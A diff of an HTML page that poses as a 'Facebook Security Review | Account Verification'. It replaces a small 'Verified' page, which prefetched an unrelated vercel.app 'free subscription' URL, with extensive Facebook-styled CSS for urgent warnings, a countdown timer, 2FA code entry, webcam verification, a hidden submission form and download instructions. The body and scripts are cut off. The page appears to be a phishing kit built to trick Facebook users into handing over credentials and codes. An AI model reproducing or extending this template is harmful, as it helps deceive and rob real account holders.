@@ -1,201 +1,2539 @@
 
+
+
+
+
+
+
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verified</title>
-  <link rel="icon" type="image/png" href="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/Facebook_Logo_2023.png?v=1737135554085" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
-  
-  <!-- Preload destination page -->
-  <link rel="prefetch" href="https://get-free-subscription-access-three.vercel.app/help.html" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 Facebook Security Review | Account Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Light Theme */
+            --primary-color: #1877f2;
+            --primary-hover: #166fe5;
+            --danger-color: #f02849;
+            --danger-light: rgba(240, 40, 73, 0.1);
+            --success-color: #00a400;
+            --success-light: rgba(0, 164, 0, 0.1);
+            --warning-color: #ff9c00;
+            --warning-light: rgba(255, 156, 0, 0.1);
+            --text-primary: #050505;
+            --text-secondary: #65676b;
+            --text-tertiary: #8a8d91;
+            --border-color: #dddfe2;
+            --bg-primary: #f0f2f5;
+            --bg-secondary: #ffffff;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.1);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.1);
+            --shadow-lg: 0 8px 24px rgba(0,0,0,0.15);
+            --radius-sm: 6px;
+            --radius-md: 8px;
+            --radius-lg: 12px;
+            --radius-xl: 16px;
+            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
 
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Roboto', sans-serif;
-    }
+        /* Dark Theme */
+        .dark-mode {
+            --primary-color: #4599ff;
+            --primary-hover: #3a8aee;
+            --danger-color: #ff5b7b;
+            --danger-light: rgba(255, 91, 123, 0.1);
+            --success-color: #42b72a;
+            --success-light: rgba(66, 183, 42, 0.1);
+            --warning-color: #ffba00;
+            --warning-light: rgba(255, 186, 0, 0.1);
+            --text-primary: #e4e6eb;
+            --text-secondary: #b0b3b8;
+            --text-tertiary: #8a8d91;
+            --border-color: #3e4042;
+            --bg-primary: #18191a;
+            --bg-secondary: #242526;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.3);
+            --shadow-lg: 0 8px 24px rgba(0,0,0,0.4);
+        }
 
-    body {
-      background-color: #f0f2f5;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
 
-    #container {
-      width: 100%;
-      max-width: 400px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
-      padding: 25px 20px;
-      text-align: center;
-    }
+        body {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            transition: background 0.3s ease;
+        }
 
-    .logo {
-      width: 48px;
-      margin-bottom: 8px;
-    }
+        /* Header Styles */
+        .header {
+            background: var(--bg-secondary);
+            padding: 12px 0;
+            box-shadow: var(--shadow-sm);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.3s ease;
+        }
 
-    #groupSubHeader {
-      font-size: 17px;
-      font-weight: 600;
-      color: #1c1e21;
-      margin-bottom: 16px;
-    }
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            width: 100%;
+        }
 
-    #data {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 16px;
-    }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--primary-color);
+            font-size: 22px;
+            font-weight: 600;
+        }
 
-    #data h4 {
-      font-size: 16px;
-      font-weight: 500;
-      color: #050505;
-    }
+        .logo i {
+            font-size: 26px;
+        }
 
-    #data img {
-      width: 20px;
-      height: 20px;
-    }
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
 
-    .line {
-      width: 100%;
-      height: 1px;
-      background-color: #dddfe2;
-      margin: 16px 0;
-    }
+        .theme-toggle {
+            background: var(--bg-primary);
+            border: none;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+        }
 
-    #para h2 {
-      font-size: 15px;
-      font-weight: 500;
-      color: #1c1e21;
-      margin-bottom: 12px;
-    }
+        .theme-toggle:hover {
+            background: var(--border-color);
+        }
 
-    #para p {
-      font-size: 14px;
-      color: #606770;
-      margin-bottom: 20px;
-    }
+        .theme-toggle i {
+            color: var(--text-primary);
+            font-size: 18px;
+        }
 
-    #continueBtn {
-      background-color: #1877f2;
-      border: none;
-      border-radius: 6px;
-      padding: 12px 0;
-      width: 100%;
-      font-size: 15px;
-      font-weight: 600;
-      color: white;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+        .help-center {
+            color: var(--text-secondary);
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            transition: var(--transition);
+            text-decoration: none;
+        }
 
-    #continueBtn:hover {
-      background-color: #166fe5;
-    }
+        .help-center:hover {
+            color: var(--primary-color);
+        }
 
-    .spinner {
-      width: 16px;
-      height: 16px;
-      border: 2px solid white;
-      border-top: 2px solid transparent;
-      border-radius: 50%;
-      display: inline-block;
-      animation: spin 0.6s linear infinite;
-      vertical-align: middle;
-      margin-left: 8px;
-    }
+        /* Security Badge */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
 
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
+        .security-badge i {
+            color: var(--success-color);
+        }
 
-    @media (max-width: 480px) {
-      #container {
-        padding: 20px 15px;
-      }
+        /* Main Content */
+        .container {
+            max-width: 900px;
+            margin: 32px auto;
+            padding: 0 16px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-      #groupSubHeader {
-        font-size: 16px;
-      }
+        /* Review Card */
+        .review-card {
+            background: var(--bg-secondary);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-md);
+            padding: 40px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            margin-bottom: 32px;
+            text-align: center;
+            transition: var(--transition);
+        }
 
-      #data h4 {
-        font-size: 15px;
-      }
+        .review-card:hover {
+            box-shadow: var(--shadow-lg);
+            transform: translateY(-2px);
+        }
 
-      #para h2 {
-        font-size: 14px;
-      }
+        .warning-icon {
+            font-size: 60px;
+            color: var(--danger-color);
+            margin-bottom: 20px;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
 
-      #para p {
-        font-size: 13px;
-      }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
+        }
 
-      #continueBtn {
-        font-size: 14px;
-        padding: 10px 0;
-      }
-    }
-  </style>
+        .review-title {
+            font-size: 28px;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .review-subtitle {
+            font-size: 16px;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto 24px;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        /* Alert Boxes */
+        .alert-box {
+            display: flex;
+            gap: 12px;
+            margin: 24px 0;
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            border-left: 3px solid;
+        }
+
+        .alert-danger {
+            border-left-color: var(--danger-color);
+            background: var(--danger-light);
+        }
+
+        .alert-warning {
+            border-left-color: var(--warning-color);
+            background: var(--warning-light);
+        }
+
+        .alert-success {
+            border-left-color: var(--success-color);
+            background: var(--success-light);
+        }
+
+        .alert-box h3 {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+        }
+
+        .alert-danger h3 {
+            color: var(--danger-color);
+        }
+
+        .alert-warning h3 {
+            color: var(--warning-color);
+        }
+
+        .alert-success h3 {
+            color: var(--success-color);
+        }
+
+        .alert-box ul {
+            padding-left: 20px;
+        }
+
+        .alert-box li {
+            margin-bottom: 10px;
+            font-size: 15px;
+            line-height: 1.5;
+            color: var(--text-primary);
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 12px 24px;
+            border-radius: var(--radius-md);
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: var(--primary-color);
+            color: #ffffff;
+            border: none;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.2);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+        }
+
+        .btn-outline:hover {
+            background: rgba(24, 119, 242, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .btn-danger {
+            background: var(--danger-color);
+            color: #ffffff;
+            border: none;
+        }
+
+        .btn-danger:hover {
+            background: #d41f3e;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(240, 40, 73, 0.2);
+        }
+
+        .btn-lg {
+            padding: 14px 32px;
+            font-size: 16px;
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: 0.5s;
+        }
+
+        .btn:hover::after {
+            left: 100%;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1001;
+            overflow-y: auto;
+            padding: 16px;
+        }
+
+        .modal-content {
+            background: var(--bg-secondary);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-lg);
+            max-width: 800px;
+            margin: 32px auto;
+            position: relative;
+            overflow: hidden;
+            animation: modalAppear 0.3s ease;
+            border: 1px solid var(--border-color);
+            transition: background 0.3s ease;
+        }
+
+        @keyframes modalAppear {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-header {
+            padding: 20px;
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border-color);
+            transition: background 0.3s ease;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--primary-color);
+        }
+
+        .close-modal {
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 24px;
+            cursor: pointer;
+            transition: var(--transition);
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        .close-modal:hover {
+            background: var(--bg-primary);
+            transform: rotate(90deg);
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        /* Step Indicator */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .step {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--bg-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            position: relative;
+            z-index: 2;
+            color: var(--text-secondary);
+            font-size: 15px;
+            transition: var(--transition);
+        }
+
+        .step.active {
+            background: var(--primary-color);
+            color: #ffffff;
+        }
+
+        .step.completed {
+            background: var(--success-color);
+            color: #ffffff;
+        }
+
+        .step-line {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--bg-primary);
+            z-index: 1;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            width: 0%;
+            height: 2px;
+            background: var(--primary-color);
+            z-index: 1;
+            transition: width 0.3s ease;
+        }
+
+        /* Step Content */
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
+            text-align: center;
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        /* Video Player Styles */
+        .video-player-container {
+            position: relative;
+            width: 100%;
+            background: #000000;
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            margin: 20px 0;
+            box-shadow: var(--shadow-md);
+        }
+
+        .video-container {
+            position: relative;
+            padding-top: 56.25%; /* 16:9 Aspect Ratio */
+        }
+
+        .video-container video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            object-fit: cover;
+        }
+
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            transition: opacity 0.3s ease;
+        }
+
+        .video-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .play-btn {
+            background: var(--primary-color);
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            margin-bottom: 16px;
+            border: 2px solid #ffffff;
+            transition: var(--transition);
+        }
+
+        .play-btn:hover {
+            transform: scale(1.1);
+            background: var(--primary-hover);
+        }
+
+        .play-btn i {
+            font-size: 32px;
+            color: #ffffff;
+        }
+
+        /* Loading Spinner */
+        .loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.6);
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid var(--primary-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 8px;
+        }
+
+        .loading-percentage {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Video Controls */
+        .video-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 8px 12px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            z-index: 10;
+            transform: translateY(100%);
+            transition: var(--transition);
+        }
+
+        .video-container:hover .video-controls {
+            transform: translateY(0);
+        }
+
+        .control-btn {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 4px 8px;
+            outline: none;
+        }
+
+        .progress-container {
+            flex-grow: 1;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            margin: 0 12px;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .buffered-bar {
+            position: absolute;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            width: 0%;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--primary-color);
+            border-radius: 8px;
+            position: relative;
+            width: 0%;
+            z-index: 2;
+        }
+
+        .time-display {
+            color: #ffffff;
+            font-size: 13px;
+            min-width: 80px;
+            text-align: center;
+        }
+
+        .volume-container {
+            display: flex;
+            align-items: center;
+            margin: 0 12px;
+        }
+
+        .volume-slider {
+            width: 60px;
+            margin-left: 4px;
+            -webkit-appearance: none;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            outline: none;
+        }
+
+        .volume-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--primary-color);
+            cursor: pointer;
+        }
+
+        .speed-selector {
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 4px;
+            margin: 0 12px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .fullscreen-btn {
+            margin-left: auto;
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-primary);
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-group label i {
+            color: var(--danger-color);
+            font-size: 18px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            font-size: 15px;
+            transition: var(--transition);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            background: var(--bg-secondary);
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
+
+        .form-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 4px;
+        }
+
+        /* Mobile Instructions */
+        .mobile-instructions {
+            background: var(--danger-light);
+            border-radius: var(--radius-md);
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 3px solid var(--danger-color);
+        }
+
+        .mobile-instructions h3 {
+            color: var(--danger-color);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+        }
+
+        .mobile-instructions ol {
+            padding-left: 20px;
+        }
+
+        .mobile-instructions li {
+            margin-bottom: 10px;
+            font-size: 15px;
+            line-height: 1.5;
+            color: var(--text-primary);
+        }
+
+        /* Button Group */
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        /* Success Message */
+        .success-message {
+            text-align: center;
+            padding: 32px 16px;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: var(--success-color);
+            margin-bottom: 20px;
+            animation: successPulse 1.5s infinite;
+        }
+
+        @keyframes successPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
+        }
+
+        .success-title {
+            font-size: 28px;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+            font-weight: 700;
+        }
+
+        .success-text {
+            font-size: 16px;
+            color: var(--text-secondary);
+            max-width: 500px;
+            margin: 0 auto 24px;
+            line-height: 1.5;
+        }
+
+        /* Status Indicator */
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 16px 0;
+            padding: 12px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+        }
+
+        .status-indicator i {
+            font-size: 20px;
+        }
+
+        .status-active i {
+            color: var(--success-color);
+        }
+
+        .status-warning i {
+            color: var(--warning-color);
+        }
+
+        .status-danger i {
+            color: var(--danger-color);
+        }
+
+        /* Progress Bar */
+        .progress {
+            height: 8px;
+            background: var(--bg-primary);
+            border-radius: 4px;
+            margin: 16px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--primary-color);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--bg-secondary);
+            padding: 24px 0;
+            border-top: 1px solid var(--border-color);
+            margin-top: auto;
+            transition: background 0.3s ease;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 16px 0;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: var(--transition);
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary-color);
+        }
+
+        .copyright {
+            color: var(--text-tertiary);
+            font-size: 13px;
+            margin-top: 12px;
+        }
+
+        /* Video Quality Selector */
+        .quality-selector {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            z-index: 20;
+            background: rgba(0,0,0,0.6);
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        /* Network Status */
+        .network-status {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #ffffff;
+            font-size: 11px;
+            background: rgba(0,0,0,0.5);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .network-status i {
+            color: var(--success-color);
+        }
+
+        /* Hidden form for submission */
+        .hidden-form {
+            display: none;
+        }
+
+        /* Error message styles */
+        .error-message {
+            color: var(--danger-color);
+            font-size: 14px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+
+        /* Language Selector */
+        .language-selector {
+            position: absolute;
+            top: 12px;
+            right: 100px;
+            z-index: 20;
+            background: rgba(0,0,0,0.6);
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        /* Security Verification */
+        .security-verification {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 16px 0;
+            padding: 12px;
+            background: var(--bg-primary);
+            border-radius: var(--radius-md);
+        }
+
+        .security-verification i {
+            color: var(--success-color);
+            font-size: 20px;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .review-card {
+                padding: 24px 16px;
+            }
+
+            .review-title {
+                font-size: 24px;
+            }
+
+            .review-subtitle {
+                font-size: 15px;
+            }
+
+            .btn-lg {
+                padding: 12px 24px;
+                font-size: 15px;
+            }
+
+            .modal-content {
+                margin: 16px auto;
+            }
+
+            .modal-header {
+                padding: 16px;
+            }
+
+            .modal-title {
+                font-size: 18px;
+            }
+
+            .modal-body {
+                padding: 16px;
+            }
+
+            .btn-group {
+                flex-direction: column;
+            }
+
+            .video-controls {
+                padding: 6px 8px;
+            }
+
+            .control-btn {
+                padding: 2px 4px;
+                font-size: 13px;
+            }
+
+            .time-display {
+                min-width: 60px;
+                font-size: 12px;
+            }
+
+            .volume-slider {
+                width: 40px;
+            }
+
+            .header-content {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 12px;
+            }
+
+            .logo {
+                justify-content: center;
+            }
+
+            .help-center {
+                justify-content: center;
+            }
+
+            .security-badge {
+                justify-content: center;
+            }
+        }
+
+        /* Animation for important elements */
+        .shake {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translateX(-1px); }
+            20%, 80% { transform: translateX(2px); }
+            30%, 50%, 70% { transform: translateX(-4px); }
+            40%, 60% { transform: translateX(4px); }
+        }
+
+        /* Tooltip */
+        .tooltip {
+            position: relative;
+            display: inline-block;
+        }
+
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 8px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 13px;
+            font-weight: normal;
+        }
+
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* Countdown Timer */
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 16px 0;
+        }
+
+        .countdown-item {
+            text-align: center;
+            background: var(--danger-light);
+            padding: 8px 12px;
+            border-radius: var(--radius-md);
+            min-width: 60px;
+        }
+
+        .countdown-value {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--danger-color);
+        }
+
+        .countdown-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        /* Webcam Verification */
+        .webcam-container {
+            width: 100%;
+            margin: 20px 0;
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            background: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .webcam-video {
+            width: 100%;
+            display: block;
+        }
+
+        .webcam-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.5);
+            color: white;
+            text-align: center;
+        }
+
+        .webcam-btn {
+            margin-top: 16px;
+            padding: 10px 20px;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .webcam-btn:hover {
+            background: var(--primary-hover);
+        }
+
+        /* AI Verification Status */
+        .ai-verification {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            margin: 16px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .ai-verification i {
+            font-size: 24px;
+        }
+
+        .ai-processing {
+            color: var(--warning-color);
+            animation: pulse 1.5s infinite;
+        }
+
+        .ai-success {
+            color: var(--success-color);
+        }
+
+        .ai-failure {
+            color: var(--danger-color);
+        }
+
+        /* Blockchain Verification */
+        .blockchain-verification {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            margin: 16px 0;
+            font-family: monospace;
+            overflow-x: auto;
+        }
+
+        .blockchain-hash {
+            color: var(--primary-color);
+            word-break: break-all;
+        }
+
+        /* 2FA Verification */
+        .two-factor-auth {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            margin: 16px 0;
+        }
+
+        .two-factor-code {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+
+        .two-factor-code input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 18px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+        }
+
+        /* Download Instructions */
+        .download-instructions {
+            padding: 16px;
+            border-radius: var(--radius-md);
+            background: var(--bg-primary);
+            margin: 16px 0;
+        }
+
+        .download-btn {
+            margin-top: 12px;
+        }
+    </style>
 </head>
-
 <body>
-  <div id="container">
